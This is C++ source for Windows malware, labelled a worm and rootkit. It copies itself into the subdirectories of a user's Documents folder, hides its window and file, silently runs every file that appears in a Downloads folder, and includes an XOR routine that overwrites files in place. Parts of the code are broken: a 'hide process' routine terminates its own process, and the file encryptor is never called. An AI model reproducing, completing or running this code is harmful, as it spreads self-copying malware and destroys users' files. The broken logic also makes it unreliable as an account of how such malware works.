#include <iostream>
#include <vector>
#include <filesystem>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <chrono>
#include <TlHelp32.h>
#include <Shellapi.h>

namespace fs = std::filesystem;
using namespace std;

class ProcessHider {
public:
    static void HideProcess() {
        HWND hwnd = FindWindowA(NULL, "ConsoleWindowClass");
        if (hwnd != NULL) {
            ShowWindow(hwnd, SW_HIDE);
        }
    }
};

class ProcessEnumerator {
public:
    static void HideWormProcess() {
        DWORD currentProcessId = GetCurrentProcessId();
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            return;
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hProcessSnap, &pe32)) {
            CloseHandle(hProcessSnap);
            return;
        }

        do {
            if (pe32.th32ProcessID == currentProcessId) {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);
    }
};

class FileHider {
public:
    static void HideWormFile(const std::string& wormPath) {
        DWORD attributes = GetFileAttributes(wormPath.c_str());
        if (attributes != INVALID_FILE_ATTRIBUTES) {
            SetFileAttributes(wormPath.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN);
        }
    }
};

class WormReplicator {
public:
    static void ReplicateWorm(const std::string& sourcePath, const std::string& destinationDirectory) {
        std::string destinationPath = destinationDirectory + "\\worm.exe";
        std::ifstream sourceFile(sourcePath, std::ios::binary);
        std::ofstream destinationFile(destinationPath, std::ios::binary);
        destinationFile << sourceFile.rdbuf();
    }
};

class DownloadExecutor {
public:
    static void ExecuteDownload(const std::string& filePath) {
        ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
    }
};

class DownloadMonitor {
public:
    static void MonitorDownloads(const std::string& downloadDirectory) {
        while (true) {
            for (const auto& entry : fs::directory_iterator(downloadDirectory)) {
                if (fs::is_regular_file(entry.path())) {
                    std::string filePath = entry.path().string();
                    if (IsValidExecutable(filePath)) {
                        DownloadExecutor::ExecuteDownload(filePath);
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }

    static bool IsValidExecutable(const std::string& filePath) {
        // Implement validation logic here
        return true;
    }
};

class FileEncryptor {
public:
    static void EncryptFile(const std::string& filePath) {
        // Implement custom encryption logic here
        // For example, you could perform a simple XOR encryption

        // Read file contents
        std::ifstream inputFile(filePath, std::ios::binary);
        std::vector<char> buffer((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
        inputFile.close();

        // Perform encryption (XOR with a key)
        char key = 0x5A; // Example key
        for (char& byte : buffer) {
            byte ^= key;
        }

        // Write encrypted data back to the file
        std::ofstream outputFile(filePath, std::ios::binary | std::ios::trunc);
        outputFile.write(buffer.data(), buffer.size());
        outputFile.close();
    }
};

class Rootkit {
public:
    static void StartWorm(const std::string& initialDirectory) {
        std::vector<std::string> targetDirectories;
        for (const auto& entry : fs::directory_iterator(initialDirectory)) {
            if (fs::is_directory(entry.path())) {
                targetDirectories.push_back(entry.path().string());
            }
        }
        for (const auto& directory : targetDirectories) {
            WormReplicator::ReplicateWorm("worm.exe", directory);
        }

        std::thread downloadThread(DownloadMonitor::MonitorDownloads, "C:\\Downloads");
        downloadThread.detach();
    }

    static int RootkitMain() {
        StartWorm("C:\\Users\\User\\Documents");
        ProcessHider::HideProcess();
        ProcessEnumerator::HideWormProcess();
        FileHider::HideWormFile("C:\\Users\\User\\Documents\\worm.exe");

        while (true) {
            Sleep(1000);
        }

        return 0;
    }
};


